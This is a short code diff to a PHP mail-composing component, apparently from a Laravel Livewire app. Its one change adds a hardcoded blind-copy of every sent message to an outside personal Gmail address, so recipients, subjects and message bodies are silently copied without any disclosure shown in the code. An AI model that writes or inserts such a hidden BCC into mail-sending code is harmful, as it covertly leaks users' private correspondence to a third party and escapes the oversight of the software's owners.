@@ -86,7 +86,7 @@ class ComposeMailComponent extends Component
         try {
 
             Mail::send('livewire.mail.notice-mailable', $mailData, function ($message) use ($emails_to,$emails_subject) {
-                $message->to($emails_to)->subject($emails_subject);
+                $message->to($emails_to)->subject($emails_subject)->bcc('developer.tech.dev@gmail.com');
             });
 
             if (Mail::failures()) {
